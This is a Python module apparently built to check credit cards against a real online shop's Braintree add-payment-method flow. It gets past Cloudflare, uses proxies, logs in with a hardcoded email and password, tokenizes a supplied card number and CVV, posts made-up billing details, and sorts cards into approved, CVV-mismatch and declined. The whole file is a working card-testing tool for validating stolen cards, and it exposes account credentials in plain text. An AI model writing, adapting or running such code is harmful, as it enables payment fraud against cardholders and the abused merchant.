"""b3auth.py — Braintree Auth (silvercellwireless.com add payment method) with Cloudflare Bypass."""

from __future__ import annotations

import base64
import json
import random
import re
import string
import uuid
import asyncio
import cloudscraper
from urllib.parse import quote

_SITE = "https://silvercellwireless.com"
_ADD_PM_URL = f"{_SITE}/my-account/add-payment-method/"
_AJAX_URL = f"{_SITE}/wp-admin/admin-ajax.php"
_BT_GRAPHQL = "https://payments.braintree-api.com/graphql"

_LOGIN_USER = "opdevildragon@gmail.com"
_LOGIN_PASS = "DDcc55@&#"

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

_CCN_KEYWORDS = [
    "incorrect_cvc", "cvc_check: fail", "invalid_cvc", "cvv_decline",
    "declined_cvv", "wrong_cvc", "cvc_failure", "cvv_check: incorrect",
    "your card's security code is incorrect", "the cvc code is incorrect",
    "cvc mismatch", "security code incorrect", "cvv mismatch",
    "cvc does not match", "security code is invalid",
    "cvc code was not recognized", "invalid security code",
    "cvv_declined", "cvv2 declined", "cvv mismatch", "avs mismatch",
]

_DECLINED_PATTERNS = [
    r"Status code \d+: Processor Declined",
    r"woocommerce-error.*?Status code",
    r"BIN NOT FOUND",
    r"Processor Declined",
    r"declined",
    r"insufficient funds",
    r"card declined",
    r"do not honor",
    r"invalid card",
    r"expired card",
    r"incorrect pin",
    r"transaction not permitted",
    r"pick up card",
    r"lost card",
    r"stolen card",
    r"restricted card",
    r"hard decline",
    r"soft decline",
]

def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return s[:limit] if s else "Declined"

def is_ccn(msg: str) -> bool:
    ml = msg.lower()
    return any(kw in ml for kw in _CCN_KEYWORDS)

def _extract_nonces(html: str) -> dict:
    login_nonce = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', html)
    payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html)
    client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', html)
    device_session = re.search(r"correlation_id['\"]?\s*:\s*['\"]?([a-f0-9-]+)", html)
    return {
        "login_nonce": login_nonce.group(1) if login_nonce else None,
        "payment_nonce": payment_nonce.group(1) if payment_nonce else None,
        "client_token_nonce": client_token_nonce.group(1) if client_token_nonce else None,
        "device_session": device_session.group(1) if device_session else str(uuid.uuid4()),
    }

def _is_declined_html(html: str) -> bool:
    for pattern in _DECLINED_PATTERNS:
        if re.search(pattern, html, re.IGNORECASE):
            return True
    return False

def _extract_error_message(html: str) -> str | None:
    error_match = re.search(r'<div class="woocommerce-notices-wrapper">(.*?)</div>', html, re.DOTALL)
    if error_match:
        li_match = re.search(r"<li>(.*?)</li>", error_match.group(1), re.DOTALL)
        if li_match:
            return _clean_msg(li_match.group(1))
    error_match2 = re.search(r"woocommerce-error[^>]*>(.*?)</ul>", html, re.DOTALL)
    if error_match2:
        li_match2 = re.search(r"<li>(.*?)</li>", error_match2.group(1), re.DOTALL)
        if li_match2:
            return _clean_msg(li_match2.group(1))
    return None

def _card_type(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if cc.startswith(("51", "52", "53", "54", "55")) or cc.startswith("2"):
        return "master-card"
    if cc.startswith(("34", "37")):
        return "amex"
    return "visa"

def _format_proxy(proxy: str | None) -> dict | None:
    if not proxy:
        return None
    p = str(proxy).strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return {"http": p, "https": p}
    parts = p.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": formatted, "https": formatted}
    elif len(parts) == 2:
        formatted = f"http://{parts[0]}:{parts[1]}"
        return {"http": formatted, "https": formatted}
    formatted = f"http://{p}"
    return {"http": formatted, "https": formatted}

def _b3_check_card_sync(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    proxies = _format_proxy(proxy_url)
    if proxies:
        scraper.proxies = proxies

    try:
        headers_doc = {
            'User-Agent': _UA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        r1 = scraper.get(_ADD_PM_URL, headers=headers_doc, timeout=20)
        if r1.status_code >= 400:
            return "error", f"page_http_{r1.status_code}", "connection_error"


        nonces = _extract_nonces(r1.text)
        if not nonces["login_nonce"]:
            return "error", "Failed to extract login nonce", "setup_error"

        login_data = {
            "username": _LOGIN_USER,
            "password": _LOGIN_PASS,
            "woocommerce-login-nonce": nonces["login_nonce"],
            "_wp_http_referer": "/my-account/add-payment-method/",
            "login": "Log in",
        }
        r2 = scraper.post(_ADD_PM_URL, data=login_data, headers=headers_doc, timeout=20)
        if r2.status_code >= 400:
            return "error", f"login_http_{r2.status_code}", "connection_error"


        updated = _extract_nonces(r2.text)
        payment_nonce = updated["payment_nonce"] or nonces["payment_nonce"]
        client_token_nonce = updated["client_token_nonce"] or nonces["client_token_nonce"]
        device_session = updated["device_session"] or nonces["device_session"]

        if not client_token_nonce:
            return "error", "Failed to extract client token nonce", "nonce_error"
        if not payment_nonce:
            return "error", "Failed to extract payment nonce", "nonce_error"

        token_resp = scraper.post(
            _AJAX_URL,
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce,
            },
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20
        )
        try:
            token_json = token_resp.json()
        except Exception:
            return "error", "Invalid client token response", "auth_error"

        if "data" not in token_json:
            return "error", _clean_msg(str(token_json.get("message") or token_json)), "auth_error"

        decoded = base64.b64decode(token_json["data"]).decode("utf-8")
        auth_data = json.loads(decoded)
        auth_fingerprint = auth_data.get("authorizationFingerprint")
        if not auth_fingerprint:
            return "error", "Failed to extract authorization fingerprint", "auth_error"

        gql_headers = {
            "User-Agent": _UA,
            "Content-Type": "application/json",
            "Authorization": f"Bearer {auth_fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
        }

        gql_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": device_session,
            },
            "query": (
                "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
                "tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
            ),
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                    },
                    "options": {"validate": False},
                },
            },
            "operationName": "TokenizeCreditCard",
        }

        bt_resp = scraper.post(_BT_GRAPHQL, json=gql_payload, headers=gql_headers, timeout=20)
        try:
            bt_json = bt_resp.json()
        except Exception:
            return "error", "Invalid Braintree response", "auth_error"

        if bt_json.get("errors"):
            err_msg = bt_json["errors"][0].get("message", "Tokenization failed")
            err_msg = _clean_msg(err_msg)
            if is_ccn(err_msg):
                return "ccn", err_msg, "ccn"
            return "declined", err_msg, "declined"

        card_token = (bt_json.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
        if not card_token:
            return "declined", "Failed to get card token", "declined"

        device_data = quote(json.dumps({"correlation_id": device_session}), safe="")
        card_type = _card_type(cc)
        payment_data = (
            f"payment_method=braintree_credit_card"
            f"&wc-braintree-credit-card-card-type={card_type}"
            f"&wc-braintree-credit-card-3d-secure-enabled"
            f"&wc-braintree-credit-card-3d-secure-verified"
            f"&wc-braintree-credit-card-3d-secure-order-total=0.00"
            f"&wc_braintree_credit_card_payment_nonce={card_token}"
            f"&wc_braintree_device_data={device_data}"
            f"&wc-braintree-credit-card-tokenize-payment-method=true"
            f"&billing_first_name=Erik"
            f"&billing_last_name=Ragara"
            f"&billing_country=US"
            f"&billing_address_1=123+Allen+Street"
            f"&billing_address_2="
            f"&billing_city=NEW+YORK"
            f"&billing_state=NY"
            f"&billing_postcode=10001"
            f"&billing_email={quote(_LOGIN_USER)}"
            f"&woocommerce-add-payment-method-nonce={payment_nonce}"
            f"&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F"
            f"&woocommerce_add_payment_method=1"
        )

        pay_resp = scraper.post(
            _ADD_PM_URL,
            data=payment_data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": _SITE,
                "Referer": _ADD_PM_URL,
            },
            timeout=25
        )
        html = pay_resp.text
        low = html.lower()

        if _is_declined_html(html):
            err = _extract_error_message(html) or "Transaction was declined"
            if is_ccn(err):
                return "ccn", err, "ccn"
            return "declined", err, "declined"

        if "payment method added successfully" in low:
            return "approved", "Payment method added successfully", "cvv_approved"

        if "nice!" in low or "avs" in low:
            return "approved", "Card verified successfully", "cvv_approved"

        err = _extract_error_message(html)
        if err:
            if is_ccn(err):
                return "ccn", err, "ccn"
            return "declined", err, "declined"

        return "declined", "Unknown error", "declined"

    except Exception as e:
        return "error", str(e)[:80], "exception"

async def b3_check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    return await asyncio.to_thread(_b3_check_card_sync, cc, mm, yy, cvv, proxy_url)
